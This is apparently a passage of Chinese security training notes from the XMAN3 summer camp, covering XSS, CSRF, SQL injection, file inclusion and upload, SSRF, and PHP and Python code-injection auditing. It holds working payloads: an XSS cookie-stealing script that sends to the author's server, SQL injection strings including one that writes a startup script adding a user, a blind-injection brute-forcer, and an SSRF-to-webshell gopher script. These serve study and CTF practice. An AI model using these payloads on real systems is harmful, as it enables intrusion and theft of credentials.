break; $$i = $$i +1; } echo $i; ?\u0026gt; Payload：  \u0026lt;script\u0026gt; with(document){ location=`//760096541/`+escape(cookie) } \u0026lt;/script\u0026gt;  过滤了字符 . 使用 with(){} 指定作用域，地址转化为十进制（该十进制为指定的自己的服务器，在自己的服务器上可以得到cookie参数）    XSS防御 #   Chrome XSS Filter 过滤（不安全） 转义和编码 → 较安全的方法：编码（转成实体编码） HttpOnly → 后端代码中可以将Cookie添加一个给HttpOnly属性，这样就不会被前端的JS读取到  CSRF攻击与防御 #   CSRF: Cross-Site Request Forgery  CSRF攻击 #   攻击分类：GET型、POST型、伪造请求、JSON  307跳转：307跳转可以不改变请求主体，只改变请求目标。现在自己的服务器上放置一个main.html，包含产生307的flash，在统计   CSRF绕过：  空Referer → get请求、data协议、https向http跳转 Referer前缀绕过。比如检测前缀https://www.qq.com，可以自己注册域名https://www.qq.comxx.xx    CSRF防御 #   方式：验证码、添加token、Referer  同源分析 #   源：协议 + 域名 + 端口  跨域方式 #    Ajax：可以发送请求，但是不能带cookie\n  CORS → 跨域资源共享\n  windows.name可以跨域\n  Jsonp → 可以实现从其他网站获取数据。数据包中的content是可控的。\n a页面希望或许b页面的数据 → a向b发送一个jsonp请求 → 调用a页面中定义的CallBack函数    jsonp攻击方式 → SOME攻击 #  SOME攻击：用户访问a.com可以实现在b.com上执行javascript\n http://b.com/index.html  \u0026lt;form\u0026gt; \u0026lt;button onclick=\u0026#34;c()\u0026#34;\u0026gt;Secret Button\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; function c() {alert(\u0026#34;click!\u0026#34;);} \u0026lt;/script\u0026gt;  http://b.com/jsonp.php  \u0026lt;?php ?\u0026gt; http://a.com/some1.html http://a.com/some2.html  CSP → content-src-policy #  CSP绕过：\n url跳转：在default-src为\u0026rsquo;none\u0026rsquo;的情况下，可以使用meta标签实现跳转 标签预加载：CSP对link标签的预加载考虑不完善 利用浏览器补全 代码重用 → Blackhat2017上有篇ppt总结了可以被用来绕过CSP的一些JS库 iframe → 如果同源的其他页面内没有CSP限制，则可以利用没有限制的页面实现绕过CSP meta标签 → meta可以控制缓存（在header没有设置的情况下），有时可以用来绕过CSP nonce  "},{"id":39,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day7/","title":"Day7","section":"xman3","content":"Web服务器端安全 #  前置知识 #  Http协议 #   url说明  协议 http + 用户密码 user@pass +ip地址 127.0.0.1 + 端口port 8080 + 页面 index.php + 参数 ?id=123 + 锚点 #123 Http(s)协议：URL、HOST、User-Agent、Referer（代表跳转来源 → 可以用与做流量统计）、Cookie（反序列化）、X-Forwarded-For    SQL注入 #   根本原因：脚本语言无法理解SQL语句，对查询语句处理不一致，导致SQL注入，篡改了SQL语句原本逻辑  SQL注入防御 #   字符串拼接形式：过滤单引号、双引号、反斜杠等关键词；转义(addslashes、mysqli_real_escape_string) 变量绑定，先给sql查询变量一个占位符，然后调用mysql的库进行预编译。  String sql = \u0026#34;select id, no from user where id=?\u0026#34;; PrepareStatement ps = conn.prepareStatement(sql); ps.SetInt(1, id); ps.executeQuery(); SQL注入类型 #    Union注入\n 适用场景：有回显，可以看到某些字段的回显结果。union语句可以用来填充查询结果，并且额外执行一次查询。用法实例，对于以下的php：  $$id = isset($_GET[\u0026#39;id\u0026#39;]) ? $$_GET[\u0026#39;id\u0026#39;] : 1; $$sql = \u0026#34;SELECT * FROM news WHERE tid=\u0026#39;{ $$id}\u0026#39;\u0026#34;; $$result = mysql_query($sql, $$conn) or die(mysql_error()); $$row = mysql_fetch_array($$result, MYSQL_ASSOC); echo \u0026#34;\u0026lt;h2\u0026gt;{ $row[\u0026#39;title\u0026#39;]}\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;{ $row[\u0026#39;content\u0026#39;]}\u0026lt;/p\u0026gt;\u0026lt;br /\u0026gt;\u0026#34;; mysql_free_result($result);   我们可以构造以下payload：\n100\u0026#39; union select 1, 2, @@version   实际执行的sql语句为\n  select * from news where tid=1 union select 1, 2, @@version  Union注入限制：很多攻击场景不是select注入，union语句被很多网页过滤    报错注入：数据报错语句中包含SQL语句执行结果\n 常见报错注入函数：floor、extractvalue、updatexml\u0026hellip; floor payload：  and select 1 from (select count(*), concat(version(), floor(rand(0)*2)) x from information_schema.tables group by x) a);%23  extractvalue payload（改变offset从0增加，可以读取数据库中的所有表名）：  and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1 offset 1)));%23  updatexml payload：  and 1 = (updatexml(1, concat(0x3a, (select user())), 1));%23  Exp payload：  Exp(~(select * from (select user()) a));%23   Boolean盲注\n 在数据回显的不同，逐个爆破猜测。example，payload\u0026amp;sql:  xx\u0026#39; and pass \u0026gt; \u0026#39;123\u0026#39;%23 select *from user where user = \u0026#39;xx\u0026#39; and pass \u0026gt; \u0026#39;123\u0026#39;#   截取字符串的相关函数：\n left(Str,len) → 从左侧截取Str的前num位 substr(Str,offset,len) → 从offset（最开始位置标记为1）开始截取Str的len长度。ascii() 将字符转化为ascii值。mid(Str,offset,len) 用法相同。 regex 正则表达式的用法。比如匹配user为root的正则表达式用法：select user() regexp '^root' 。可以嵌套if语句使用：  select * from users where id=1 and 1=(if((user() regexp \u0026#39;^r\u0026#39;), 1, 0));#   PS：mysql默认不区分大小写，可以先用binary函数处理\n    Timing 盲注\n 页面不存在不同回显，但SQL语句被执行 → 逐个猜测 + 延时执行 payload：  if(ascii(substr(database(),1,1))\u0026gt;115,0,sleep(5))%23  MySQL：  BENCHMARK(100000, MD5(1)) or sleep(5)    课后习题Python爆破代码：  import requests from random import sample md5str = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyz}\u0026#39; # 最后一个字符表示一个比z大的ascii码字符 url = \u0026#39;http://202.112.51.184:8001/\u0026#39; payload = {\u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;test\u0026#39;} # 声明payload为一个字典 crackres = [\u0026#39;unsolve\u0026#39;]*33 crackres[32] = \u0026#39;end\u0026#39; # 标志crack结果list的末尾 crackpos = 0 # 从0开始爆破 session = requests.Session() defaultlen = len(session.post(url, data=payload).content) while crackres[crackpos] != \u0026#39;end\u0026#39;: for index in range(len(md5str)): thispassword = \u0026#39;\u0026#39;.join(crackres[0:crackpos]) + md5str[index+1] payload[\u0026#39;username\u0026#39;] = \u0026#34;admin\u0026#39; and password \u0026gt; \u0026#39;\u0026#34; + thispassword + \u0026#34;\u0026#39;#\u0026#34; response = session.post(url, data=payload) if len(response.content) != defaultlen: crackres[crackpos] = md5str[index] break crackpos = crackpos + 1 print(\u0026#39;Password md5: \u0026#39;,\u0026#39;\u0026#39;.join(crackres[0:32])) SQL注入的利用代码 #    猜测MySQL的表名和字段名：MySQL的Information_schema数据库存储了整个数据库的结构信息，存放在Information_schema.tables、Information_schema.columns表中。\n 爆数据库 payload：  union select 1,2,database()%23  爆表名 payload：  union select 1, table_name, 3 from information_schema.tables where table_schema=\u0026#39;test\u0026#39; limit 0,1%23  爆列名 payload：  union select 1, column_name, 3 from information_schema.columns where table_name=\u0026#39;admin\u0026#39; limit 0,1%23   文件读写\n 读取关键文件  select LOADFILE(\u0026#39;/etc/passwd\u0026#39;);  写入shell：  select \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; into dumpfile \u0026#39;/var/www/html/1.php\u0026#39;  mysql5.7之后，引入了secure-file-priv新特性来限制LOAD DATA, SELECT \u0026hellip; OUTFILE, and LOAD_FILE()    命令执行\n 利用数据库对服务器写启动脚本：  union select 1,2,3,\u0026#34;net user cimer cimer /ad\u0026#34; into outfile \u0026#39;C:/documents and settings/all users/start menu/programs/startup/add.bat\u0026#39;   WAF绕过 #   WAF：Web Application Firewall，web应用防护系统。    双写关键字 → 针对WAF是用简单的非迭代的将select、or语句替换为空字符串。比如：SEselectLECT →replace→ SELECT\n  大小写绕过：应用简单的区分大小写的关键字匹配，比如php中的preg_match函数没有加/i参数\n  编码绕过：\n ASCII。比如：  select * from admin where username=(CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)) 其他：16进制、unicode编码、URL编码（开发程序员不知道url会自动解码一次，自己再写了url解码函数，我们可以将URL编码两次）    more trick：\n  and → \u0026amp;\u0026amp; ； or → || ； select username from admin → select(username)from(admin)、select\\**\\username\\**\\from\\**\\admin （%a0、%0a、%0d、%09、tab\u0026hellip;）。\n  科学记数法绕过：where username=1e1union select\n  \u0026gt;, =, \u0026lt; 被限制：where pass in (1,2)、where id between 1 and 3、like\n  mysql对%00不会截断：se%00lect\n  PS：SQL测试语法（测试字符 '1' 与字符 a 的大小）：select '1' \u0026gt; 'a'\n    其他注入方式 #   二次注入：攻击者将恶意SQL语句插入到数据库中，程序直接带入查询 宽字节注入：当数据库中使用了宽字符集（如GBK），会将一些两个字符当作一个字符。  比如：0xbf27、0xbf5c 反斜杠是0x5c，使用addslashes()等转义函数在处理输入时会将\u0026quot;、\\、\u0026ldquo;这些字符用反斜杠转义，输入0xbf27，转义后变成了0xbf5c27。   sprintf → 执行语句使用sprintf和vsprintf进行拼接，且进行了两次拼接，第一次拼接的参数可控：  \u0026lt;?php $$input = addslashes(\u0026#34;%1$$\u0026#39; and 1=1#\u0026#34;); $$b = sprintf(\u0026#34;AND b=\u0026#39;%s\u0026#39;\u0026#34;, $$input); ... $$sql = sprintf(\u0026#34;SELECT * FROM t WHERE a=\u0026#39;%s\u0026#39; $$b\u0026#34;, \u0026#39;admin\u0026#39;); echo $sql; ?\u0026gt;命令执行漏洞 #   应用有时需要调用一些执行系统命令的函数，比如php中的system、exec、shell_exec、passthru、popen、proc_popen等。 程序过滤不严谨，用户可以将代码注入并执行。高危函数：eval()、assert() preg_replace函数用于对字符串进行正则处理（当pattern中存在/e模式修饰时，$replace部分会被解释为PHP代码执行）：  mixed preg_replace(mixed $$pattern, mixed $replacement, mixed $subject[, int $limit=-1[, int \u0026amp;$$count]]) 文件包含 #   在web开发中，为什么要使用本地文件包含？ → 提高代码重用性 如何获取临时文件名？利用：phpinfo()  本地文件包含 LFI #    常见函数\n include()、require() → require函数找不到文件就会引发一个错误。比如：  \u0026lt;?php include(_GET[...]); ?\u0026gt; PS：include once() → 若文件中代码已经包含则不会再次被包含    使用 filter 的php协议读取敏感文件的base64代码：\n  http://www.test.com/index.php?page=php://filter/convert.base64-encode/resource=../../../../ect/passwd\r  使用 /proc/self/environ 进行文件包含\n 当向任意php文件post请求上传数据时，可以直接在phpinfo()页面找到临时文件的路径和名字    临时文件生存周期短，如何延长？\n 通过分块传输编码，提前获知临时文件的名称 通过增加临时文件名后的 数据长度来延长时间 通过大量请求来延迟PHP脚本的执行速度    包含临时文件（条件竞争）\n  其他的文件包含 #   有限制的LFI 远程文件包含RFI：利用 phar:// 和 zip:// 伪协议可以解压缩包含一句木马  文件上传 #    最简单的文件上传代码：\nif(is_uploaded_file($_[\u0026#39;myfile\u0026#39;][\u0026#39;tmp_name\u0026#39;])){ $$upload_file=$$_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $$file_true_name=$$_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;]; if(move_upload_file($$upload_file, $$file_true_name)) echo $_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;].\u0026#34;上传成功\u0026#34;; else echo \u0026#34;上传失败\u0026#34;; }else echo \u0026#34;上传失败\u0026#34;;   防御文件上传 #    客户端的javaScript校验，通常校验扩展名 → 此时并没有发送数据包 → 抓包改包轻松爆破\n  检测MIME类型。\n 客户端判断：$_FILES['myfile']['type']=='image/jpeg' → 类型也是根据文件名获取的 服务端判断：  $finfo = finfo_open(FILEINFO_MINE); $$mimetype = finfo_file($finfo, $$file_true_name);   检查内容 → 黑名单（看上去很有效，但实际上只要是黑名单就可以被绕过） → 耗费资源\n$$content = file_get_contents($$file_true_name); if(stripos($content, \u0026#34;\u0026lt;?php\u0026#34;)){ die(\u0026#34;php!!!\u0026#34;); }   隐藏文件 → 移到一个不为人知的路径 → 受到业务需求的限制，文件必须被访问到\n$$file_true_name=$secrect_path.$$_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;]; if(move_uploaded_file($$uploaded_file, $$file_true_name) echo $_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;].\u0026#34;上传成功\u0026#34;; else echo \u0026#34;上传失败\u0026#34;;   随机文件名（局限性同上）：\n$$file_true_name=md5(rand(1,1000)).$$_FILES[\u0026#39;myfile\u0026#39;][\u0026#39;name\u0026#39;];   检查文件扩展名\n 最直接最有效的方法 → web服务器通过不同的问文件扩展名 黑名单绕过  php → php3、php5、phtms、 pHp\u0026hellip; jsp → jspx、 jspf asp → asa、 cer、 aspx\u0026hellip;   白名单的绕过  截断绕过：文件名 → test.php(0x00).jpg 利用NTFS ADS特性、IIS5.x-6.x解析漏洞 Apache解析漏洞：Apache解析文件名是从右向左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如：test.php.owf 会被Apache解析为 test.php Nginx解析漏洞：cgi.fix_pathinfo开启时（为1），当访问 www.xx.com/phpinfo.jpg/q.php 时，会将 phpinfo.jpg 当作php进行解析。      认证与授权 #   Authentication \u0026amp; Authorization 密码强度：OWASP推荐，6|8多种组合  认证 #   Session认证  SessionID标识身份，存在会话周期，常见保存于Cookie中 Cookie劫持：嗅探、本地文件窃取、XSS攻击 Session Fixation攻击：攻击者发起登录请求获得SessionID → 令用户使用该SessionID向服务器发起登录请求 → 用户登录成功，攻击者可以伪造用户在服务器进行操作   单点登录SSO  简介： 三方参与 → 用户、浏览器、OpenID提供者 用户只需要登录一次、风险过于集中、OpenID提供者参差不齐    授权 #   用户只能访问有限的资源，就是访问控制  基于url的访问控制、基于方法的访问控制、基于数据的访问控制   越权 → 水平越权（用户之间的越权访问）、垂直越权（用户得到管理员权限）  "},{"id":40,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day8/","title":"Day8","section":"xman3","content":"代码审计 #  PHP代码审计 #   什么是代码审计：是指对源代码进行检查，寻找代码的bug，这里主要寻找可以导致安全漏洞的bug 代码审计的技巧（程序的两大根本：变量与函数）：  根据敏感的关键字回溯参数的传递过程 查找可控变量，正向追踪变量的传递过程 查找敏感功能点，通读功能点代码 直接通读全文代码   自动化审计工具：Seay（PHP代码审计工具）、Cobra、Fortify SCA\u0026hellip;  SSRF漏洞 #   SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。  常见后端实现 #    可以进行SSRF的常见后端实现：\n 使用file_get_content()，从用户指定的url获取图片，并把他保存下来：  \u0026lt;?php if(isset($_POST[\u0026#39;url\u0026#39;])){ $$content = file_get_contents($$_POST[\u0026#39;url\u0026#39;]); $filename = \u0026#39;./images/\u0026#39;.rand().\u0026#39;;img1.jpg\u0026#39;; file_put_contents($$filename, $$content); echo $_POST[\u0026#39;url\u0026#39;]; $$img = \u0026#34;\u0026lt;img src=\\\u0026#34;\u0026#34;.$$filename.\u0026#34;\\\u0026#34;/\u0026gt;\u0026#34;; } echo $img; ?\u0026gt;使用fsockopen()函数 → 这个函数会利用socket跟服务器建立TCP连接，传输用户指定的url数据数据：  \u0026lt;?php function GetFile($$host, $port, $$link){ $$fp = fsockopen($host, intval($host), $errno, $$errstr, 30); if(!$$fp) echo \u0026#34;$errstr(erro number $$errno) \\n\u0026#34;; else{ $$out = \u0026#34;GET $$linkHTTP/1.1\\r\\n\u0026#34;; $$out .= \u0026#34;HOST: $$host\\r\\n\u0026#34;; $out .= \u0026#34;Connection: Close\\r\\n\\r\\n\u0026#34;; $out .= \u0026#34;\\r\\n\u0026#34;; fwrite($$fp, $$out); $contents=\u0026#39;\u0026#39;; while(!feof($$fp)) $content .= fgets($$fp, 1024); fclose($fp); return $contents; } } ?\u0026gt;使用curl()获取数据：  \u0026lt;?php if(isset($_POST[\u0026#39;url\u0026#39;])){ $$link = $$_POST[\u0026#39;url\u0026#39;]; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($$curlobj, CURLOPT_URL, $$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $$result = curl_exec($$curlobj); curl_close($curlobj); $filename = \u0026#39;./curled/\u0026#39;.rand().\u0026#39;.txt\u0026#39;; file_put_contents($$filename, $$result); echo $result; } ?\u0026gt;  总结：高危函数：file_get_contents()、fsockopen()、curl_exec()。区别：\n 大部分php不会打开fopen的gopher wrapper file_get_contents的gopher协议不能URLencode curl_exec()默认不跟踪跳转 file_get_contents支持php://input协议    SSRF利用 #   利用curl自带的协议进行攻击（http://php.net/manual/en/wrappers.php） 利用SSRF攻击本地服务  fastcgi：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html   攻击数据库\u0026amp;缓存：  Redis → 六种利用方式：（1）保存到www目录，创建webshell；（2）创建SSH authotrized_keys文件；（3）写计划任务（/var/spool/cron/ \u0026amp; /etc/cron.d/）；（4）slave of 8.8.8.8 主从模式利用；（5）写入到/etc/profile.d/用户环境变量；（6）开启AOF持久化纯文本记录appendfilename。 Memcached：利用内存中的数据，读取管理员的Session，修改adminid。 CounchDB：能够发起SSRF请求，HTTP /_replicate API     P.S.：gopher转换规则实例（gopher协议使用方法：gopher://ip:port/payload）：  #coding:utf-8 import sys exp = \u0026#39;\u0026#39; with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in \u0026#39;\u0026gt;\u0026lt;+\u0026#39;: # 以\u0026#34;\u0026lt;\u0026gt;+\u0026#34;开头的行不计入计算 # 以\u0026lt;\u0026gt;开头的表示请求和返回的时间，如果前三个字符是+OK表示返回的字符串 continue elif line == \u0026#39;\\x0a\u0026#39;: # 如果该行只有一个0x0a字符 exp = exp + \u0026#39;%0a\u0026#39; # 空白行替换为%0a elif line[-3:-1] == r\u0026#39;\\r\u0026#39;: # 判该行的倒数第3到倒数第2位是否为r\u0026#39;\\r\u0026#39; if len(line) == 3: # 如果该行的长度为3，即上一步判断的为全部的内容 exp = exp + \u0026#39;%0a%0d%0a\u0026#39; else: line = line.replace(r\u0026#39;\\r\u0026#39;,\u0026#39;%0d%0a\u0026#39;) line = line.replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;) exp = exp + line else: line = line.replace(\u0026#39;\\n\u0026#39;,\u0026#39;\u0026#39;) exp = exp + line SSRF练习 #   读取password所在文件：http://oj.momomoxiaoxi.com:9090/index.php?url=file:///etc/passwd → 一般只用于测试payload是否有效。 使用dirsearch对目标进行扫描： python dirsearch.py http://oj.momomoxiaoxi.com:9090 -e php 扫描出一个 robots.txt 文件，我们再用第一步的方法访问该文件 → http://oj.momomoxiaoxi.com:9090/index.php?url=file:///var/www/html/robots.txt → 其中 /var/www/html/ 是Apache的根文件夹，扫描文件没有越权无法获得操作系统的根文件夹，认为Apache的入口文件夹为根文件夹 在robots.txt文件中存在一个 webshe11111111.php 文件，我们用同样的方法访问该文件 → view-source:http://oj.momomoxiaoxi.com:9090/index.php?url=file:///var/www/html/webshe11111111.php 得到php源代码：  \u0026lt;?php $serverList = array( \u0026#34;127.0.0.1\u0026#34; ); $$ip = $$_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; foreach ($$serverList as $$host) { if ($$ip === $$host) { if ((!empty($$_POST[\u0026#39;admin\u0026#39;])) and $$_POST[\u0026#39;admin\u0026#39;] === \u0026#39;h1admin\u0026#39;) { @eval($_POST[\u0026#39;hacker\u0026#39;]); } else die(\u0026#34;You aren\u0026#39;t admin!\u0026#34;); } else die(\u0026#39;This is webshell\u0026#39;); } ?\u0026gt;利用dict协议查看端口开启情况，以下为编写Python脚本：  import requests url = \u0026#39;http://oj.momomoxiaoxi.com:9090/index.php?url=\u0026#39; defaultlen = len(requests.get(url+\u0026#39;dict://127.0.0.1:0/info\u0026#39;).content) print(\u0026#34;defaultlen:%d\u0026#34;%defaultlen) for x in range(1000): try: response = requests.get(url+\u0026#39;dict://127.0.0.1:%s/info\u0026#39;%str(x)) if len(response.content) != defaultlen: print(\u0026#34;Port %s, content: %s\u0026#34;%(str(x), response.content)) except Exception as e: print(e) pass 我们发现22端口和80端口处于开启状态，其中80端口返回400 Bad Request，我们尝试使用9090端口作为跳板攻击80端口 配置本地环境：使用Apache打开两个端口进行测试，在其中一个端口配置之前抓取下来的PHP文件，并向其发送POST请求，使用FireFox抓取发送的数据包，复制进入Python即可获得以下Python脚本：  import urllib.parse from selenium import webdriver PostHead = \u0026#34;\u0026#34;\u0026#34;\\ POST /webshe11111111.php HTTP/1.1 Host: 127.0.0.1:80 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: http://127.0.0.1:9090/ Content-Type: application/x-www-form-urlencoded Content-Length: 31 Connection: keep-alive Upgrade-Insecure-Requests: 1 admin=h1admin\u0026amp;hacker=phpinfo(); \u0026#34;\u0026#34;\u0026#34; shellurl = \u0026#34;http://oj.momomoxiaoxi.com:9090/index.php?url=gopher://127.0.0.1:80/\u0026#34; firstParse = urllib.parse.quote(PostHead) new = firstParse.replace(\u0026#34;%0A\u0026#34;,\u0026#34;%0D%0A\u0026#34;) secondParse = \u0026#34;_\u0026#34; + urllib.parse.quote(new) getrequest = shellurl + secondParse driver = webdriver.Chrome() driver.get(getrequest) 我们发现页面正常显示了phpinfo()页面，说明我们的shell反弹成功了，接下来更改eval执行代码和长度就可以得到webshell了。   PS其他： 常见url编码（https://www.w3schools.com/tags/ref_urlencode.asp）：     Char \\r : ; \\n % = \u0026amp; , space     url-encode %0A %3A %3B %0D %25 %3D %26 %2C %20    SSRF常见的绕过技巧 #   更改IP地址写法  一些开发者会通过传过来的URL参数进行正则表达式匹配来过滤内网IP，比如  ^10(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$ ^172\\.([1][6-9]|[2]\\d|3[01])(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$ ^192\\.168(\\.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$   我们可以采用改编IP的方式进行绕过。比如地址192.168.0.1可以写成：  八进制格式：0300.0250.0.1 十六进制格式：C0.A8.0.1 十进制整数格式：3232235521 十六进制整数格式：0xC0A80001     利用解析URL所出现的问题  在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。解析不当可能导致绕过。比如：http://www.baidu.com@192.168.0.1/ 实际上请求的是192.168.0.1上的内容。   利用302跳转  在网络上存在一个很神奇的服务：当我们访问 http://xip.io 这个网站的子域名时，会将子域名自动重定向到高一级的域名，比如 http://192.168.0.1.xip.io → http://192.168.0.1 。  另外，内网IP有可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。使用网址   也可以自己实现一个302跳转。在自己的服务器上部署一个中转跳转文件，跳转到内网地址（127.0.0.1）（是在限制了可用协议为http(s)，但支持CURLOPT_FOLLOWLOCATION下的周转措施。   通过各种非HTTP协议  如果服务端程序对访问URL所采用的协议进行验证的话，我们可以通过非HTTP协议进行利用。 主要有两个协议：gopher://协议与file://   利用DNS Rebinding  完整的攻击流程：  服务器获得URL参数，进行第一次DNS解析，获得了一个非内网的IP 对于获得的IP进行判断，发现为非黑名单IP，则通过验证 服务器对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址 由于已经绕过验证，所以服务器返回访问内网资源的结果     PS：利用浏览器：127。0。0。1 →浏览器解析→ 127.0.0.1  SSRF防御 #   过滤返回信息；统一错误信息；限制请求端口为HTTP常用端口（80、443、8080、8090）；黑名单内网IP，给请求域设置白名单；禁止不需要的协议；禁止请求域名的301的跳转。  代码执行及命令执行漏洞 #    代码注入高危函数：eval()、assert()、preg_replace()、call_user_func()\u0026hellip;\n eval和assert函数：这两个函数原本作用于动态代码执行：  \u0026lt;?php error_reporting(0); show_source(__FILE__); $$a = @$$_REQUEST[\u0026#39;hello\u0026#39;]; eval(\u0026#34;var_dump($a);\u0026#34;); ?\u0026gt; preg_replace() 函数原型：mixed preg_replace(mixed $$pattern, mixed $replace, mixed $subject [, int $limit = -1 [, int \u0026amp;$count]])。当 $pattern 中存在 /e 模式修饰符时，$$replacement 会被看成PHP代码来执行。比如下面的程序会执行替换后的 \\\\1 的代码：  preg_replace(\u0026#34;/\\[(.*)\\]/e\u0026#34;, \u0026#34;\\\\1\u0026#34;, $_GET[\u0026#39;str\u0026#39;]);   文件包含注高危函数：include()、include_once()、require()、require_once()。以及各个伪协议：\n  php:// 伪协议可以访问各个输入输出流。常见用法：php://input →\n  解释：php://input 指向原始POST数据\n  用法：比如以下Demo可以实现简单利用\n// GET数据：localhost:8080/?payload=php://input // POST数据：Simple Use // 后端程序：index.php =\u0026gt; \u0026lt;?php echo file_get_contents($_GET[\u0026#39;payload\u0026#39;]); ?\u0026gt;  如果php.ini里面的 allow_url_include=On(PHP \u0026lt; 5.30) 就可以造成任意代码执行，在这里可以理解成远程文件包含漏洞（RFI），即POST一句话就可以执行。当head头中有 enctype=\u0026quot;multipart/form-data\u0026quot; 时，该伪协议无效。\n    data:// 伪协议为数据封装器，将原本的include的文件流重定向到了用户可以控制的输入流中，就是说执行的文件包含方法包含了输入流。常见用法：data://text/plain →\n  解释：一种不需要向其他位置寻找数据的数据协议描述方式。\n  用法：data:[\u0026lt;mime type\u0026gt;][;charset=\u0026lt;charset\u0026gt;][;\u0026lt;encoding\u0026gt;],\u0026lt;encoded data\u0026gt;\n// payload: \u0026lt;?php phpinfo() // payload_base64: PD9waHAgcGhwaW5mbygpOw== // URI: localhost:8080/?payload=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== // 后端程序：index.php =\u0026gt; \u0026lt;?php include($_GET[\u0026#39;payload\u0026#39;]);   注意：payload没有 ?\u0026gt; 闭合。如果php.ini里面的 allow_url_include=On ，就可以造成任意代码执行。\n    phar:// 伪协议亦为数据封装器，php解压缩包的函数，解压的压缩包与后缀无关。\n  用法：phar://压缩包/内部文件 。比如：\n// php.php =\u0026gt; \u0026lt;?php phpinfo(); ?\u0026gt;// php.php -\u0026gt; php.zip 放在网站根目录下 // URI：localhost:8080/?payload=phar://php.zip/php.php // 后端程序：index.php =\u0026gt; \u0026lt;?php include($_GET[\u0026#39;payload\u0026#39;]);   注意：php版本需要大于5.3，压缩包格式是zip，利用url的压缩包后缀可以是任意后缀。\n      命令执行高危函数：system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open()\u0026hellip;\n  补充知识 #  变量覆盖 #   指的是我们可以用自定义的参数值来替换程序原有的变量值。 主要原因大多由函数使用不当造成的。主要有以下几个函数：extract()、Parse_str()、import_request_variables()；还有部分应用$$$$方式进行变量注册也容易导致变量覆盖。  \u0026lt;?php $chr = \u0026#39;\u0026#39;; if($$_POST \u0026amp;\u0026amp; $$charset != \u0026#39;utf-8\u0026#39;){ $$chs = new Chinese(\u0026#39;UTF-8\u0026#39;, $$charset); foreach($$_POST as $key =\u0026gt; $$value) $$$key = $chs-\u0026gt;Convert($$value); unset($chs); } ?\u0026gt;全局变量泄露 #  \u0026lt;?php include \u0026#34;flag.php\u0026#34;; $$a = @$$_REQUEST[\u0026#39;hello\u0026#39;]; if(!preg_match(\u0026#39;/^\\w*$$/\u0026#39;,$$a)) die(\u0026#39;ERROR\u0026#39;); eval(\u0026#34;val_dump($$$$a);\u0026#34;); show_source(__FILE__); ?\u0026gt;ChinaZ例题讲解 #  "},{"id":41,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day9/","title":"Day9","section":"xman3","content":"Python代码审计 #  OS命令注入 #    与OS命令注入攻击相关的模块：eval()、os.system()、os.popen*、subprocess.popenos.spawn*、commands.*、popen2.*。\n 下面是一个用Python中Django写的，可以利用eval命令注入的简单Python Web服务的Demo：  def eval_test(request): if request.method == \u0026#39;GET\u0026#39;: return render_to_response(\u0026#39;eval.html\u0026#39;,context_instance=RequesetContext(request)) elif request.method == \u0026#39;POST\u0026#39;: domain = request.POST.get(\u0026#39;domain\u0026#39;,\u0026#39;\u0026#39;) command = \u0026#34;os.popen(\u0026#39;whois\u0026#34; + domain + \u0026#34;\u0026#39;)\u0026#34; output = eval(command) return render_to_response(\u0026#39;eval.html\u0026#39;, {\u0026#39;output\u0026#39;:output.readlines()}, context_instance=RequestContext(request))  OS命令注入：subprocess.call函数（shell=True时，函数会在命令前添加-c选项）。开发建议 → 使用pipes.quote()函数去过滤用户输入；尽量不要使用shell=True\u0026hellip;  subprocess.call(\u0026#34;cat \u0026#34; + user_input, shell=True) subprocess.call(\u0026#34;cat %s\u0026#34;%(user_input), shell=True) subprocess.call(\u0026#34;cat {0}\u0026#34;.format(user_input), shell=True)   简单练习 #  @app.route(\u0026#34;/eval/\u0026#34;) def eval_test(): ip = request.args.get(\u0026#39;ip\u0026#39;, \u0026#39;127.0.0.1\u0026#39;) output = os.popen(\u0026#39;ping -c 2\u0026#39; + ip).readlines() output = \u0026#39;\u0026lt;br\u0026gt;\u0026#39;.join(output) t = Template(output) return r.render() 服务端模板注入（SSTI） #    发生在MVC框架的view层。\n 